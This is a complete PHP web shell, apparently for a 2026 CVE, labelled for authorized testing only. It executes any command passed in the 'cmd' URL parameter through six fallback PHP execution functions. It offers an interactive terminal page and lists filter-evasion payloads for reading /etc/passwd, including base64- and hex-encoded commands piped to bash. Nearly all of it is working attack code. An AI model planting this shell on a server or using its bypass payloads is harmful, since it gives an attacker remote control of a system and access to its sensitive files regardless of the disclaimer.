<?php
// CVE-2026-3844 Enhanced Shell - For Authorized Security Testing Only
// Multiple bypass methods for comprehensive testing

error_reporting(0);
set_time_limit(0);

// Verification token
echo "CVE-2026-3844-VERIFIED\n";

// Multiple command execution methods with bypasses
function executeCmd($cmd) {
    $output = '';
    $methods = [];

    // Method 1: shell_exec (basic)
    if (function_exists('shell_exec')) {
        $output = @shell_exec($cmd . ' 2>&1');
        if ($output) {
            $methods[] = 'shell_exec';
            return ['method' => 'shell_exec', 'output' => $output];
        }
    }

    // Method 2: exec
    if (function_exists('exec')) {
        @exec($cmd . ' 2>&1', $output_array, $return_var);
        if (!empty($output_array)) {
            $output = implode("\n", $output_array);
            $methods[] = 'exec';
            return ['method' => 'exec', 'output' => $output];
        }
    }

    // Method 3: system
    if (function_exists('system')) {
        ob_start();
        @system($cmd . ' 2>&1');
        $output = ob_get_contents();
        ob_end_clean();
        if ($output) {
            $methods[] = 'system';
            return ['method' => 'system', 'output' => $output];
        }
    }

    // Method 4: passthru
    if (function_exists('passthru')) {
        ob_start();
        @passthru($cmd . ' 2>&1');
        $output = ob_get_contents();
        ob_end_clean();
        if ($output) {
            $methods[] = 'passthru';
            return ['method' => 'passthru', 'output' => $output];
        }
    }

    // Method 5: proc_open (advanced)
    if (function_exists('proc_open')) {
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );

        $process = @proc_open($cmd, $descriptorspec, $pipes);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            $error = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);

            if ($output || $error) {
                $methods[] = 'proc_open';
                return ['method' => 'proc_open', 'output' => $output . $error];
            }
        }
    }

    // Method 6: popen
    if (function_exists('popen')) {
        $handle = @popen($cmd . ' 2>&1', 'r');
        if ($handle) {
            $output = stream_get_contents($handle);
            pclose($handle);
            if ($output) {
                $methods[] = 'popen';
                return ['method' => 'popen', 'output' => $output];
            }
        }
    }

    return ['method' => 'none', 'output' => 'No execution method available'];
}

// Enhanced command handling with bypasses
function processCommand($input) {
    // Command bypass techniques
    $bypasses = [
        // Space bypass
        'cat${IFS}/etc/passwd',
        'cat$IFS/etc/passwd',
        'cat<>/etc/passwd',
        'cat</etc/passwd',
        // Quote bypass
        'c"a"t /etc/passwd',
        "c'a't /etc/passwd",
        'c\at /etc/passwd',
        // Variable bypass
        'c$@at /etc/passwd',
        'c${x}at /etc/passwd',
        // Wildcard bypass
        'c?t /etc/passwd',
        'c*t /etc/passwd',
        '/b??/c?t /etc/passwd',
        // Base64 bypass
        'echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash',
        // Hex bypass
        'echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash'
    ];

    // If input matches bypass pattern, suggest alternatives
    if (strpos($input, 'cat /etc/passwd') !== false && !executeCmd('cat /etc/passwd')['output']) {
        return "Original command blocked. Try bypass methods:\n" . implode("\n", $bypasses);
    }

    return executeCmd($input);
}

// Interactive mode
if (isset($_GET['i']) && $_GET['i'] == '1') {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>CVE-2026-3844 Interactive Shell</title>
        <style>
            body { background: #000; color: #0f0; font-family: monospace; }
            .terminal { width: 100%; height: 400px; background: #000; color: #0f0; border: none; padding: 10px; }
            .input { width: 80%; background: #000; color: #0f0; border: 1px solid #0f0; padding: 5px; }
            .output { background: #111; color: #0f0; padding: 10px; margin: 10px 0; white-space: pre-wrap; }
        </style>
    </head>
    <body>
        <h2>CVE-2026-3844 Interactive Shell - Authorized Testing Only</h2>
        <div>Current User: <?php echo executeCmd('whoami')['output']; ?></div>
        <div>Current Directory: <?php echo executeCmd('pwd')['output']; ?></div>
        <div>System Info: <?php echo executeCmd('uname -a')['output']; ?></div>

        <form method="get">
            <input type="hidden" name="i" value="1">
            <input type="text" name="cmd" class="input" placeholder="Enter command..." autofocus>
            <input type="submit" value="Execute">
        </form>

        <?php if (isset($_GET['cmd']) && !empty($_GET['cmd'])): ?>
            <div class="output">
                <strong>Command:</strong> <?php echo htmlspecialchars($_GET['cmd']); ?><br>
                <strong>Result:</strong><br>
                <?php
                $result = processCommand($_GET['cmd']);
                echo htmlspecialchars($result['output']);
                echo "<br><em>Method used: " . $result['method'] . "</em>";
                ?>
            </div>
        <?php endif; ?>

        <div class="output">
            <strong>Available Bypass Techniques:</strong><br>
            - Space: ${IFS}, $IFS, &lt;&gt;, &lt;<br>
            - Quotes: "a", 'a', \a<br>
            - Variables: $@, ${x}<br>
            - Wildcards: ?, *<br>
            - Encoding: base64, hex<br>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Command line mode
if (isset($_GET['cmd'])) {
    $result = processCommand($_GET['cmd']);
    echo $result['output'];
    exit;
}

// Default info
echo "System: " . php_uname() . "\n";
echo "PHP Version: " . phpversion() . "\n";
echo "Current User: " . executeCmd('whoami')['output'];
echo "Current Directory: " . executeCmd('pwd')['output'];

// Usage instructions
echo "\nUsage:\n";
echo "?cmd=command - Execute command\n";
echo "?i=1 - Interactive web interface\n";
echo "?i=1&cmd=command - Interactive with command\n";
?>
